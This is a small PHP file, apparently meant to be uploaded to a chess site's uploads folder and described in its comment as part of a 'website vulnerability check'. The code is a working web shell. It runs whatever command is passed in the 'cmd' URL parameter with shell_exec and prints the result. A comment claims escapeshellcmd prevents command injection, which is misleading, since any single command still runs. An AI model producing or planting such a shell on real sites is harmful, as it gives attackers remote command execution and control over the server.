// A file for my website vulnerability check to ingest 'cmd' and then go to chessgame/uploads/scrypt.php?cmd=whoami
<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    // Sanitize the input to prevent command injection
    $sanitized_cmd = escapeshellcmd($cmd);
    // Execute the command and capture the output
    $output = shell_exec($sanitized_cmd);
    // Display the output
    echo "<pre>$output</pre>";
} else {
    echo "No command provided.";
}